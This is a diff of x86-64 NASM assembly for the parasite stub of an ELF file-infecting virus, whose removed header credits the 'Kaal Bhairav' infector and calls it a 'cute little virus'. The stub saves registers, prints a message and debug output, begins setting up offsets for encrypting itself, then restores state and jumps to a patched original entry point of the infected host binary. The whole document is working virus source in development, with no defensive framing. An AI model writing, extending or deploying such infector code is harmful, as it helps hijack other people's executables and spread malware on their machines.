@@ -1,56 +1,107 @@
 BITS 64
 
-; Author : Abhinav Thakur
-; Email  : compilepeace@gmail.com
-
-; Description : Shellcode prints a message and transfers control to a specified address (to be patched
-;               by Kaal Bhairav with entry point address of LSB Executable - ET_EXEC)
-
-
 global _start
 
 
+;-x-x-x-x- CONSTANTS -x-x-x-x-;
+SYS_WRITE   equ 0x1         ; 1
+KEY_ADDR    equ 0x10        ; 16
+;-x-x-x-x- CONSTANTS -x-x-x-x-;
+
+
+
 section .text
-
-
 _start:
-
 	; Save register state, RBX can be safely used
 	push rax
 	push rcx
 	push rdx
-	push rsi
 	push rdi
-	push r11
 
-	
 	jmp	parasite
-	message:	db	"-x-x-x-x- COMPILEPEACE : Cute little virus ^_^ -x-x-x-x-", 0xa
-
+	message:	db	"-x-x-x-x- \_<O>_<O>_/ -x-x-x-x-", 0xa
+	filepath:   db  "/proc/self/maps", 0x0
+	newline:	db 	0xa
+	debug:		db 	"another one" , 0xa
+	encStart:	dq	0x1111111111111111
 
 parasite:
 
 	; Print our message
+	; %rax      | %rdi | %rsi | %rdx
+	; sys_write	|  fd  | *buf | count
+
 	xor	rax, rax					; Zero out RAX
-	add	rax, 0x1					; Syscall number of write() - 0x1
+	add	rax, SYS_WRITE				; Syscall number of write() - 0x1
 	mov rdi, rax					; File descriptor - 0x1 (STDOUT)
 	lea rsi, [rel message]			; Addresses the label relative to RIP (Instruction Pointer), i.e. 
 									; dynamically identifying the address of the 'message' label.
 	xor rdx, rdx
-	mov dl, 0x39					; message size = 57 bytes (0x39)
-	syscall					
+	mov dl, 0x20					; message size = 30 bytes
+	syscall
+
+	xor	rax, rax
+	add	rax, SYS_WRITE
+	mov rdi, rax
+	lea rsi, [rel _start]
+	xor rdx, rdx
+	mov dl, 15
+	syscall
+
+	xor	rax, rax
+	add	rax, SYS_WRITE
+	mov rdi, rax
+	lea rsi, [rel newline]
+	xor rdx, rdx
+	mov dl, 1
+	syscall
 
 
+	push r10
+	push r13
+	; r10 -> encryption start
+	; r13 -> key start
+	; r15 -> end encryption (key start)
+	xor r13, r13
+	lea r13, [rel _start - KEY_ADDR]
+	mov r10, r13
+	sub r10, [rel encStart]
+
+
+	xor	rax, rax
+	add	rax, SYS_WRITE
+	mov rdi, rax
+	mov rsi, r10
+	xor rdx, rdx
+	mov dl, 15
+	syscall
+
+	xor	rax, rax
+	add	rax, SYS_WRITE
+	mov rdi, rax
+	lea rsi, [rel newline]
+	xor rdx, rdx
+	mov dl, 1
+	syscall
+
+	pop r13
+	pop r10
+
+ender:
 	; Restoring register state
-	pop r11
 	pop rdi
-	pop rsi
 	pop rdx
 	pop rcx
 	pop rax
-
 	
-	; jmp to original host entry point (to be patched by kaal bhairav)
-	mov	rbx, 0xAAAAAAAAAAAAAAAA		
-	jmp	rbx
+	push r12
 
+	xor r12, r12
+	xor r10, r10
+	mov r12, 0xAAAAAAAAAAAAAAAA ; get jump addr from patch
+	lea r10, [rel _start - KEY_ADDR] ; get rel addr of end of text
+	sub r10, r12 ; sub size of [entrypoint - _start] to _start addr
+
+	pop r12
+
+	jmp	r10
